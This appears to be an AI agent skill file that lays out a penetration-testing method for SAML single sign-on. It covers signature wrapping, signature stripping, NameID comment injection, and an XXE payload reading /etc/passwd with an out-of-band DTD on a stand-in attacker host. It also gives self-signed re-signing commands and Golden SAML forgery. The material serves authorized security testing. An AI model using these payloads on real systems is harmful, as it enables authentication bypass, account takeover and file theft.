---
name: attacking-saml
description: Attack SAML single sign-on by decoding and tampering with signed XML assertions — XML signature wrapping (XSW1-XSW8), signature stripping, assertion and attribute tampering, NameID comment injection, XXE through the SAML parser, certificate faking, recipient confusion and IdP-initiated replay, and Golden SAML forgery. Use when a request carries a `SAMLRequest` or `SAMLResponse` parameter, when base64+deflate decodes to XML with `<saml:Assertion>`, when the target exposes a `/saml/acs` or `/sso` endpoint, when an IdP-initiated login lands an assertion at the SP, or when federation runs through Okta, ADFS, Ping, or Azure/Entra.
---

# Attacking SAML

SAML security is XML signature validation, and XML signatures are notoriously
hard to validate correctly. The assertion is signed — but which element is
signed, what the XML parser reads, and what the application ultimately trusts
can be three entirely different things. That gap is XML Signature Wrapping,
and it is the reason SAML breaks far more often than its cryptography suggests.

Only against systems you are authorized to test.

## When to Use

- A request or redirect carries a `SAMLRequest` or `SAMLResponse` parameter
- Base64 (plus DEFLATE for the redirect binding) decodes to XML containing
  `<saml:Assertion>`, `<samlp:Response>`, or `<saml:Subject>`
- The target exposes a `/saml/acs`, `/sso`, `/saml2/acs`, or `/Shibboleth.sso`
  Assertion Consumer Service endpoint
- An IdP-initiated login POSTs an assertion straight to the SP with no prior
  `AuthnRequest`
- Federation runs through Okta, ADFS, PingFederate, Azure/Entra, Shibboleth,
  SimpleSAMLphp, or Keycloak
- You control a low-privilege federated account and want to reach another
  identity or role

## When NOT to Use

- **The SSO flow is OAuth 2.0 or OpenID Connect** (`code`, `id_token`,
  `access_token`, `/authorize`, `/.well-known/openid-configuration`) — use
  `attacking-oauth-oidc`
- **The token is a JWT** (`eyJ...` with dot separators) rather than signed
  XML — use `attacking-jwt`
- **General web testing** with no SAML artifact in scope — use
  `testing-web-applications`
- **Golden SAML against a compromised AD FS server or cloud tenant** where you
  already hold the token-signing key — that is a tenant-takeover play in
  `attacking-entra-id`
- **Evaluating the signature primitives themselves** (SHA-1 vs SHA-256, RSA
  key size, canonicalization algorithm choice) — use `reviewing-cryptography`

## Decode and Inspect

Everything starts with reading the message. The wire format depends on the
binding.

```bash
# HTTP-Redirect binding: base64 then raw DEFLATE (no zlib header)
echo 'fVLLbtsw...' | base64 -d | python3 -c \
  "import sys,zlib; sys.stdout.write(zlib.decompress(sys.stdin.buffer.read(),-15).decode())"

# HTTP-POST binding: plain base64, no deflate
echo 'PHNhbWxwOl...' | base64 -d | xmllint --format -
```

The redirect binding uses raw DEFLATE — window bits `-15`, no header. The POST
binding does not deflate at all. Guess wrong and you get garbage; try both.

**SAML Raider** (Burp extension) is the working environment: it intercepts the
ACS POST, pretty-prints the XML, imports the IdP certificate, and drives the
signature-wrapping attacks below with a single click. Install it before doing
anything by hand.

**samltool.com** (SAMLtool by OneLogin) decodes and re-encodes messages and is
useful for understanding structure — but treat it as offline reference only.
Never paste a live production assertion into a third-party website; decode with
the commands above instead.

Read these fields first, because they define every attack that follows:

- `<ds:Signature>` — where it sits and what its `<ds:Reference URI="#...">`
  points to. This is the whole game.
- `<saml:Subject><saml:NameID>` — the identity being asserted
- `<saml:AttributeStatement>` — roles, groups, email, entitlements
- `<saml:Conditions>` — `NotBefore`, `NotOnOrAfter`, `AudienceRestriction`
- `<saml:SubjectConfirmationData>` — `Recipient`, `NotOnOrAfter`, `InResponseTo`
- `Destination` and `Issuer` on the response envelope

## XML Signature Wrapping (XSW)

The core SAML attack. The signature is cryptographically valid, but you move
the signed element somewhere the signature checker still accepts it while the
application logic reads a *different*, unsigned assertion that you control. The
verifier and the consumer disagree about which element is authoritative.

The eight canonical variants (Somorovsky et al.) differ in where the original
signed assertion is relocated and where the forged one is injected:

- **XSW1 / XSW2** — wrap the whole `<Response>`; the signature references the
  original response while a forged response is processed. XSW2 uses a
  non-enveloping signature position.
- **XSW3 / XSW4** — inject a forged assertion as a sibling of the signed
  assertion (before or after it), same or overlapping IDs.
- **XSW5 / XSW6** — copy the signature into the forged assertion; play games
  with the `ID` attribute so the reference still resolves.
- **XSW7 / XSW8** — bury the original signed assertion inside an `<Extensions>`
  or `<Object>` wrapper so it validates but is never consumed.

```
# Attack in SAML Raider:
#   1. Intercept the ACS POST, select the signed assertion
#   2. Edit NameID / attributes in the assertion the app will read
#   3. Click XSW1..XSW8 in turn — each rebuilds the document layout
#   4. Forward; watch for a successful login as the forged identity
```

Iterate through **all eight**. Which one works depends entirely on the SP's XML
library and how it selects the assertion to trust — there is no way to predict
it, so try every variant before concluding the SP is safe. A successful login
as a NameID you never legitimately held is the finding.

## Unsigned Assertions and Signature Stripping

Before the wrapping games, test the simplest failure: does the SP verify a
signature at all?

- **Strip the signature.** Remove `<ds:Signature>` entirely and forward. Some
  SPs only verify a signature *if one is present*.
- **Empty the signature.** Blank the `SignatureValue` or `DigestValue`.
- **Sign the wrong thing.** Sign the response but not the assertion, or vice
  versa, when the SP only checks one.
- **Downgrade the algorithm.** Try `SignatureMethod` of SHA-1 or even
  `md5`/no-op where the SP does not pin the expected algorithm.

```bash
# xmlsec1 can tell you what a document's signature actually covers
xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml
```

If the SP accepts a stripped or unsigned assertion, you can forge identity with
no cryptography at all — the highest-severity SAML outcome.

## Assertion Tampering

Once you can get an assertion accepted (stripped, unsigned, or via a working
XSW variant), change what it claims:

- **NameID** — swap to a target user (`admin@corp`, another tenant's user)
- **Attributes** — flip `Role`/`Group`/`memberOf` to `admin`, add
  entitlement attributes the IdP never issued, change `email` to trigger
  account linking on the SP
- **AudienceRestriction** — if the SP does not check `<Audience>`, an assertion
  minted for *another* SP in the same federation is replayable here
- **NotOnOrAfter / NotBefore** — a wide or unchecked validity window lets you
  replay a captured assertion long after it should have expired
- **InResponseTo** — for the SP-initiated flow, whether the SP binds the
  response to its own `AuthnRequest` ID; if not, injected/replayed responses
  are accepted

Test each independently. An SP that validates the signature but ignores
`AudienceRestriction` or the replay window is still fully exploitable.

## Comment Injection in NameID

A canonicalization bug in several SAML libraries (the 2018 Duo/`python-saml`/
`OneLogin` class of CVEs). XML text-node handling and signature
canonicalization disagree about how an XML comment splits a text node.

```xml
<saml:NameID>admin<!---->@evil.com</saml:NameID>
```

The signature is computed over the canonicalized value (which may drop the
comment or concatenate the nodes), while the application's text extraction
reads only the node *before* the comment — yielding `admin`. So a validly
signed assertion for `admin@evil.com` (an account you legitimately own)
authenticates you as `admin`. Try comments inside any identity-bearing field:
NameID, and email/username attributes used for account mapping.

## XXE via the SAML Parser

The SP feeds attacker-supplied XML into a parser. If external entities are not
disabled, the ACS endpoint is an XXE sink.

```xml
<?xml version="1.0"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response ...>...&xxe;...</samlp:Response>
```

Use an out-of-band DTD (`http://attacker/evil.dtd`) for blind file read and
SSRF into the SP's internal network. The full technique — parameter entities,
OOB exfiltration, error-based leakage — is in `exploiting-xxe`; the SAML angle
is simply that the assertion is the injection point and the ACS is
unauthenticated.

## Certificate Faking and Self-Signed Re-Signing

If the SP does not pin the IdP's certificate — instead trusting whatever cert
is embedded in `<ds:KeyInfo>`, or accepting any cert from a broad CA bundle —
you can strip the real signature, re-sign with your own key, and ship your cert
in the message.

```bash
# Generate a key/cert and re-sign a tampered assertion
openssl req -x509 -newkey rsa:2048 -keyout evil.key -out evil.crt -days 30 -nodes -subj "/CN=idp"
xmlsec1 --sign --privkey-pem evil.key,evil.crt \
        --id-attr:ID Assertion tampered.xml > forged.xml
```

SAML Raider automates this: "Send Certificate" imports/generates a cert, then
resigns the edited message in place. If the forged self-signed assertion is
accepted, the SP is trusting the message's own embedded key instead of a
pinned IdP cert — complete authentication bypass.

## Recipient / Destination Confusion and IdP-Initiated Replay

- **Recipient / Destination not checked.** If the SP ignores the `Recipient`
  in `SubjectConfirmationData` or the `Destination` on the response, an
  assertion captured at one SP replays at another that shares the IdP.
- **IdP-initiated replay.** IdP-initiated SSO has no `AuthnRequest` to bind to,
  so there is no `InResponseTo` and often no anti-replay state. Capture a valid
  IdP-initiated POST and re-send it — within the validity window it may log you
  straight back in. A leaked assertion in logs, referrers, or history becomes a
  usable credential.
- **Token reuse across tenants.** In multi-tenant SaaS, check whether an
  assertion issued for tenant A is accepted at tenant B's ACS.

## Golden SAML

The endgame, not the entry point. If you already hold the IdP's private
**token-signing key** (stolen from an AD FS server's certificate store, an
Azure/Entra federation trust, or an exported IdP keystore), you forge
arbitrary, perfectly-signed assertions for any user, any role, indefinitely —
no credentials, no MFA, no IdP interaction, and it survives password resets.

```bash
# With the stolen signing key, mint an assertion for any identity
xmlsec1 --sign --privkey-pem tokensigning.key,tokensigning.crt \
        --id-attr:ID Assertion golden.xml > any-user.xml
```

Obtaining the key is a host/tenant-compromise task, not a SAML-message task —
that path (extracting the AD FS token-signing cert, DKM key, or cloud
federation secret) lives in `attacking-entra-id`. Come back here only to shape
the forged assertion.

## Rationalizations to Reject

- *"The assertion is signed, so it can't be tampered with."* Signature
  wrapping keeps the signature valid while the app reads a different element.
  Signed does not mean the signed thing is what gets trusted.
- *"XSW1 didn't work, so the SP is safe."* There are eight variants for a
  reason. Run all of XSW1–XSW8 before concluding anything.
- *"It verifies the signature — I checked."* Verifying *a* signature is not
  verifying *the assertion you consume*. And it may only verify when one is
  present; strip it and test.
- *"The audience/recipient is just metadata."* If the SP doesn't enforce
  `AudienceRestriction`, `Recipient`, and `Destination`, assertions replay
  across SPs and tenants.
- *"The comment thing is cosmetic."* `admin<!---->@evil.com` authenticates as
  `admin`. Canonicalization mismatches are full account takeover.
- *"It's XML from a trusted IdP, so XXE isn't a concern."* The ACS parses the
  bytes before it trusts them, and the bytes come from your browser. Untrusted.
- *"Golden SAML needs the private key, so it's out of scope."* Forging the
  assertion is in scope here; note the exposure and route key extraction to
  `attacking-entra-id` — don't dismiss the impact.

<!-- attack:start -->

## ATT&CK Coverage

_Generated from `secskills/ttp-index.json` — edit that file, then run
`python3 scripts/sync_attack.py --write`. Re-verify IDs against the
current ATT&CK release before citing them in a report._

**Credential Access** (TA0006)

- [T1606.002](https://attack.mitre.org/techniques/T1606/002/) SAML Tokens — see also `attacking-entra-id`

Detection content for any of these: `engineering-detections`. Proactive search: `hunting-threats`. Post-compromise: `responding-to-incidents`.

<!-- attack:end -->

## References

- `attacking-oauth-oidc` — when the SSO flow is OAuth 2.0 / OpenID Connect
- `attacking-jwt` — when the token is a signed JWT rather than XML
- `exploiting-xxe` — full XXE technique when the ACS parser is the sink
- `attacking-entra-id` — Golden SAML via a compromised AD FS server or tenant
- `testing-web-applications` — the surrounding web methodology
- `reporting-security-findings` — severity for signature-bypass and replay
- SAML Raider (Burp extension), Burp Suite, xmlsec1, SAMLtool (samltool.com)
